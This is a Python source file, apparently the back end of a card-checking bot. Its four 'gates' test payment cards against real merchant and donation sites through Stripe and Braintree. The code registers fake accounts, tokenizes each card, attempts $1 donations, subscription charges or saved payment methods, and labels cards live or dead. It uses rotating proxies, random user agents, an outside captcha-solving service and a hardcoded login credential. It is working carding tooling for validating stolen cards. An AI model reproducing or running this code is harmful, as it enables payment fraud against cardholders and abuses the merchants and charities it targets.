import requests
import re
import base64
import random
import time
import uuid
import json
import os
import logging
from urllib.parse import urlparse
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder

logger = logging.getLogger(__name__)

# ============================================================================
# 🛠️ HELPER FUNCTIONS
# ============================================================================

def get_random_ua():
    return generate_user_agent(os=('linux', 'win'))

def format_proxy(proxy):
    """Formats proxy string to dictionary for requests"""
    if not proxy: return None
    try:
        if "http" in proxy: return {"http": proxy, "https": proxy}
        p = proxy.split(':')
        if len(p) == 4:
            url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}"
            return {"http": url, "https": url}
        elif len(p) == 2:
            url = f"http://{p[0]}:{p[1]}"
            return {"http": url, "https": url}
    except: return None
    return None

def create_stripe_payment_method(session, cc, pk, ua):
    """Helper to create Stripe PaymentMethod, returns (id, error_message)"""
    try:
        n, mm, yy, cvc = cc.split('|')
        if len(yy) == 2:
            yy = "20" + yy
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ua,
        }
        payload = (
            f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}'
            f'&key={pk}&payment_user_agent=stripe.js&time_on_page={random.randint(10000,50000)}'
        )
        r = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=payload, timeout=15)
        if r.status_code != 200:
            try:
                err = r.json().get('error', {}).get('message', 'Unknown')
            except:
                err = f"HTTP {r.status_code}"
            return None, err
        data = r.json()
        if 'id' in data:
            return data['id'], None
        return None, "No ID in response"
    except Exception as e:
        return None, str(e)

def load_donation_sites():
    """Load donation sites from JSON file."""
    donation_file = "donation_sites.json"
    if not os.path.exists(donation_file):
        return []
    try:
        with open(donation_file, 'r') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Failed to load donation sites: {e}")
        return []

def parse_givewp_response(text):
    """Parse GiveWP donation response"""
    text_lower = text.lower()
    if 'success' in text_lower or '"success":true' in text_lower:
        return "Donation successful", "APPROVED"
    if 'insufficient_funds' in text_lower:
        return "Insufficient Funds", "APPROVED"
    if 'incorrect_cvc' in text_lower:
        return "CCN Live (CVC Incorrect)", "APPROVED"
    if 'do_not_honor' in text_lower:
        return "Do Not Honor", "DECLINED"
    if 'pickup_card' in text_lower:
        return "Pickup Card", "DECLINED"
    if 'generic_decline' in text_lower:
        return "Generic Decline", "DECLINED"
    error_match = re.search(r'"message":"(.*?)"', text)
    if error_match:
        return f"Declined: {error_match.group(1)}", "DECLINED"
    return "Unknown response", "ERROR"

# ============================================================================
# 🚪 GATE 1: Stripe ConfigDB (roskin.co.uk) – WORKING ✅
# ============================================================================
def check_stripe_configdb(cc, proxy=None):
    """
    Stripe gate using roskin.co.uk (GiveWP + Stripe).
    Returns (response_text, status)
    """
    try:
        # Parse card
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) < 4:
            return "Invalid card format", "ERROR"
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 4:
            yy = yy[2:]  # Convert YYYY to YY

        session = requests.Session()
        if proxy:
            formatted = format_proxy(proxy)
            if formatted:
                session.proxies = formatted

        ua = get_random_ua()
        session.headers.update({'User-Agent': ua})

        # Step 1: Load donation page to get tokens
        r = session.get('https://roskin.co.uk/my-account/add-payment-method/', timeout=20)
        if r.status_code != 200:
            return f"Page load failed: {r.status_code}", "ERROR"

        # Extract registration nonce
        register_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r.text)
        if not register_nonce:
            return "Registration nonce not found", "ERROR"
        register_nonce = register_nonce.group(1)

        # Generate random email
        random_str = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
        email = f"{random_str}@gmail.com"

        # Register user (required for add-payment-method)
        reg_data = {
            'email': email,
            'password': f'Pass{random_str}',
            'woocommerce-register-nonce': register_nonce,
            'register': 'Register',
            '_wp_http_referer': '/my-account/add-payment-method/',
            'wc_order_attribution_session_entry': 'https://roskin.co.uk/my-account/add-payment-method/',
            'wc_order_attribution_session_start_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'wc_order_attribution_user_agent': ua,
        }
        session.post('https://roskin.co.uk/my-account/', params={'action': 'register'}, data=reg_data, timeout=20)

        # Now get the payment page again to extract setup intent nonce and PK
        r2 = session.get('https://roskin.co.uk/my-account/add-payment-method/', timeout=20)
        if r2.status_code != 200:
            return "Payment page load failed", "ERROR"

        # Extract createAndConfirmSetupIntentNonce
        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', r2.text)
        if not nonce_match:
            return "Setup intent nonce not found", "ERROR"
        setup_nonce = nonce_match.group(1)

        # Extract Stripe publishable key
        pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', r2.text)
        if not pk_match:
            return "Stripe PK not found", "ERROR"
        pk = pk_match.group(0)

        # Create Stripe payment method
        pm_id, err = create_stripe_payment_method(session, cc, pk, ua)
        if not pm_id:
            return f"Payment method creation failed: {err}", "ERROR"

        # Confirm setup intent via AJAX
        ajax_url = 'https://roskin.co.uk/wp-admin/admin-ajax.php'
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': setup_nonce,
        }
        r3 = session.post(ajax_url, data=data, timeout=20)
        try:
            resp = r3.json()
        except:
            return "Invalid JSON from setup intent", "ERROR"

        if resp.get('success') is True:
            return "Approved ✅", "APPROVED"
        else:
            error_msg = resp.get('data', {}).get('error', {}).get('message', 'Unknown decline')
            return f"Declined: {error_msg}", "DECLINED"

    except Exception as e:
        return f"Error: {str(e)}", "ERROR"

# ============================================================================
# 🚪 GATE 2: Braintree $50 (pixorize.com) – WORKING ✅
# ============================================================================
def check_braintree(cc, proxy=None):
    """
    Braintree gate using pixorize.com (subscription).
    Returns (response_text, status)
    """
    try:
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) < 4:
            return "Invalid card format", "ERROR"
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 4:
            yy = yy[2:]  # use last two digits

        session = requests.Session()
        if proxy:
            formatted = format_proxy(proxy)
            if formatted:
                session.proxies = formatted

        ua = get_random_ua()
        session.headers.update({'User-Agent': ua})

        # 1. Register a random user
        username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
        reg_data = {
            'email': f'{username}@gmail.com',
            'password': f'{username}##$$',
            'learner_classification': 2
        }
        r = session.post('https://apitwo.pixorize.com/users/register-simple', json=reg_data, timeout=20)
        if r.status_code != 200:
            return "Registration failed", "ERROR"

        # 2. Get Braintree client token
        r = session.get('https://apitwo.pixorize.com/braintree/token', timeout=20)
        if r.status_code != 200:
            return "Failed to get Braintree token", "ERROR"
        payload_encoded = r.json()['payload']['clientToken']
        decoded = base64.urlsafe_b64decode(payload_encoded + '=' * (-len(payload_encoded) % 4)).decode('utf-8')
        auth_fingerprint = re.search(r'"authorizationFingerprint":"(.*?)"', decoded).group(1)

        # 3. Solve captcha via external service (keep as in original)
        captcha_payload = {
            "anchor": "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LdSSo8pAAAAAN30jd519vZuNrcsbd8jvCBvkxSD&co=aHR0cHM6Ly9waXhvcml6ZS5jb206NDQz&hl=ar&type=image&v=h7qt2xUGz2zqKEhSc8DD8baZ&theme=light&size=invisible&badge=bottomright&cb=vxofomi8lsu7"
        }
        captcha_resp = requests.post(
            'https://asianprozyy.us/inv3',
            json=captcha_payload,
            headers={'Content-Type': 'application/json', 'User-Agent': ua}
        )
        captcha_token = captcha_resp.json().get('captcha')
        if not captcha_token:
            return "Captcha solving failed", "ERROR"

        # 4. Tokenize card via Braintree GraphQL
        headers = {
            'authority': 'payments.braintree-api.com',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': ua,
        }
        query = {
            "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": None},
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": n,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvc,
                        "billingAddress": {"postalCode": "10080"}
                    },
                    "options": {"validate": False}
                }
            },
            "operationName": "TokenizeCreditCard"
        }
        r = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=query, timeout=20)
        if r.status_code != 200:
            return "Tokenization failed", "ERROR"
        token = r.json()['data']['tokenizeCreditCard']['token']

        # 5. Process payment
        payment_data = {
            'subscriptionTypeId': 19,
            'nonce': token,
            'deviceData': '{"device_session_id":"15d62637417bfee016ab92c950924933","fraud_merchant_id":null,"correlation_id":"6ea0b1e5ed7ed0792221f25247f6d4d3"}',
            'promoCode': None,
            'captchaToken': captcha_token
        }
        r = session.post('https://apitwo.pixorize.com/braintree/pay', json=payment_data, timeout=20)

        if r.text.strip() == '{"envelope_version":"0.1","status":"success"}':
            return "Charge ✅", "APPROVED"
        elif 'fund' in r.text.lower():
            return "Insufficient funds ✅", "APPROVED"
        else:
            try:
                payload = r.json().get('payload', {})
                reason = payload.get('responseType') or payload.get('reason') or 'Unknown decline'
                return f"Declined: {reason}", "DECLINED"
            except:
                return "Unknown response", "ERROR"

    except Exception as e:
        return f"Error: {str(e)}", "ERROR"

# ============================================================================
# 🚪 GATE 3: Generic Stripe Donation (GiveWP) – WORKING ✅
# ============================================================================
def check_stripe_donation(cc, proxy=None):
    """
    Attempt to charge a card on a random donation site from donation_sites.json.
    Returns (response_text, status)
    """
    sites = load_donation_sites()
    if not sites:
        return "❌ No donation sites configured. Use /stsite to add.", "ERROR"

    # Try up to 5 random sites to increase chance of success
    for attempt in range(min(5, len(sites))):
        site = random.choice(sites)
        site_url = site['url']
        pk = site.get('pk')
        site_type = site.get('type', 'givewp')
        logger.info(f"Trying site: {site_url} (type: {site_type})")

        # Skip if no pk
        if not pk:
            logger.warning(f"No publishable key for {site_url}")
            continue

        try:
            session = requests.Session()
            if proxy:
                formatted = format_proxy(proxy)
                if formatted:
                    session.proxies = formatted
            ua = get_random_ua()
            session.headers.update({'User-Agent': ua})

            # Load the donation page
            r = session.get(site_url, timeout=20)
            if r.status_code != 200:
                logger.warning(f"Site {site_url} returned {r.status_code}")
                continue
            html = r.text

            # Only GiveWP type supported for now
            if site_type != 'givewp':
                logger.warning(f"Unsupported site type: {site_type}")
                continue

            # Extract GiveWP form fields – use more flexible regex
            form_id = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
            form_hash = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
            price_id = re.search(r'name="give-price-id"\s+value="([^"]+)"', html)

            if not (form_id and form_hash and price_id):
                # Try alternative patterns (sometimes fields are in different quotes)
                form_id = re.search(r'name="give-form-id".*?value=["\']([^"\']+)', html, re.DOTALL)
                form_hash = re.search(r'name="give-form-hash".*?value=["\']([^"\']+)', html, re.DOTALL)
                price_id = re.search(r'name="give-price-id".*?value=["\']([^"\']+)', html, re.DOTALL)

            if not (form_id and form_hash and price_id):
                logger.warning(f"Missing GiveWP form fields on {site_url}")
                continue

            form_id = form_id.group(1)
            form_hash = form_hash.group(1)
            price_id = price_id.group(1)

            # Create Stripe payment method
            pm_id, err = create_stripe_payment_method(session, cc, pk, ua)
            if not pm_id:
                logger.warning(f"Stripe tokenization failed: {err}")
                continue

            # Submit donation via GiveWP AJAX
            parsed = urlparse(site_url)
            ajax_url = f"{parsed.scheme}://{parsed.netloc}/wp-admin/admin-ajax.php"
            data = {
                'give-form-id': form_id,
                'give-form-hash': form_hash,
                'give-price-id': price_id,
                'give-amount': '1.00',
                'give_first': 'Ramesh',
                'give_last': 'User',
                'give_email': f'test{uuid.uuid4().hex[:8]}@gmail.com',
                'give-gateway': 'stripe',
                'action': 'give_process_donation',
                'give_ajax': 'true',
            }
            r2 = session.post(ajax_url, data=data, timeout=20)
            response_text, status = parse_givewp_response(r2.text)
            if status == 'APPROVED':
                return response_text, status
            elif status == 'DECLINED':
                # If declined, we can return immediately (or try another site)
                return response_text, status
            else:
                # Error, try another site
                continue

        except requests.exceptions.ProxyError:
            logger.warning(f"Proxy error on {site_url}")
            continue
        except Exception as e:
            logger.exception(f"Unexpected error on {site_url}: {e}")
            continue

    return "All donation sites failed", "ERROR"

# ============================================================================
# 🚪 GATE 4: braintree Auth
# ============================================================================
def check_braintree_mass(cc, proxy=None):
    """
    Braintree auth gate using bandc.com (from your separate bot).
    Now supports proxy.
    Returns (response_text, status)
    """
    try:
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) < 4:
            return "Invalid card format", "ERROR"
        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 4:
            yy = yy[2:]  # convert to YY

        # --- PROXY SETUP ---
        r = requests.Session()
        if proxy:
            formatted = format_proxy(proxy)
            if formatted:
                r.proxies = formatted

        import base64, random, string, time, uuid
        from user_agent import generate_user_agent
        from faker import Faker

        user = generate_user_agent()

        # Step 1: Get login nonce
        headers = {
            'authority': 'bandc.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://bandc.com/my-account/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': user,
        }
        resp = r.get('https://bandc.com/my-account/', headers=headers)
        logen = resp.text.split('name="woocommerce-login-nonce" value="')[1].split('"')[0]

        # Step 2: Login with a pre-defined email/password
        emails = ['aitiktokbetatefa@gmail.com']
        email = random.choice(emails)
        data = {
            'username': email,
            'password': '7132879938:AAF37jpayVhsr0QcH7i5FmNK0Apfvjzu2-Y',
            'woocommerce-login-nonce': logen,
            '_wp_http_referer': '/my-account/',
            'login': 'Login',
        }
        headers = {
            'authority': 'bandc.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://bandc.com',
            'referer': 'https://bandc.com/my-account/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': user,
        }
        r.post('https://bandc.com/my-account/', headers=headers, data=data)

        # Step 3: Get address nonce
        headers = {
            'authority': 'bandc.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://bandc.com/my-account/edit-address/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': user,
        }
        resp = r.get('https://bandc.com/my-account/edit-address/billing/', headers=headers)
        address = re.search(r'name="_wpnonce" value="(.*?)"', resp.text).group(1)

        # Step 4: Update billing address
        fake = Faker()
        foon = ''.join(random.choice('1234567890') for i in range(11))
        data = {
            'billing_first_name': fake.first_name(),
            'billing_last_name': fake.last_name(),
            'billing_company': '',
            'billing_country': 'US',
            'billing_address_1': fake.street_address(),
            'billing_address_2': '',
            'billing_city': fake.city(),
            'billing_state': fake.state(),
            'billing_postcode': '10080',
            'billing_phone': foon,
            'billing_email': email,
            'save_address': 'Save address',
            '_wpnonce': address,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address',
        }
        headers = {
            'authority': 'bandc.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://bandc.com',
            'referer': 'https://bandc.com/my-account/edit-address/billing/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': user,
        }
        r.post('https://bandc.com/my-account/edit-address/billing/', headers=headers, data=data)

        # Step 5: Get client token nonce
        headers = {
            'authority': 'bandc.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://bandc.com/my-account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': user,
        }
        resp = r.get('https://bandc.com/my-account/add-payment-method/', headers=headers)
        client_nonce = re.search(r'client_token_nonce":"([^"]+)"', resp.text).group(1)
        add_nonce = re.search(r'name="_wpnonce" value="(.*?)"', resp.text).group(1)

        # Step 6: Get client token
        headers = {
            'authority': 'bandc.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://bandc.com',
            'referer': 'https://bandc.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce}
        resp = r.post('https://bandc.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        enc = resp.json()['data']
        dec = base64.b64decode(enc).decode('utf-8')
        auth_fingerprint = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]

        # Step 7: Tokenize card via Braintree GraphQL
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': user,
        }
        ssr = str(uuid.uuid4())
        json_data = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': ssr},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
            'variables': {
                'input': {
                    'creditCard': {'number': n, 'expirationMonth': mm, 'expirationYear': yy, 'cvv': cvc},
                    'options': {'validate': False}
                }
            },
            'operationName': 'TokenizeCreditCard'
        }
        resp = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        token = resp.json()['data']['tokenizeCreditCard']['token']

        # Step 8: Submit payment method
        headers = {
            'authority': 'bandc.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://bandc.com',
            'referer': 'https://bandc.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': user,
        }
        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'master-card',
            'wc-braintree-credit-card-3d-secure-enabled': '',
            'wc-braintree-credit-card-3d-secure-verified': '',
            'wc-braintree-credit-card-3d-secure-order-total': '0.00',
            'wc_braintree_credit_card_payment_nonce': token,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            '_wpnonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        resp = r.post('https://bandc.com/my-account/add-payment-method/', headers=headers, data=data)
        text = resp.text
        if 'Payment method successfully added.' in text or 'Nice! New payment method added' in text:
            return "Approved ✅", "APPROVED"
        elif 'risk_threshold' in text:
            return "RISK: Retry later", "DECLINED"
        elif 'Please wait for 20 seconds.' in text:
            time.sleep(20)
            return "Retry", "ERROR"
        else:
            return "Declined", "DECLINED"
    except Exception as e:
        return f"Error: {str(e)}", "ERROR"
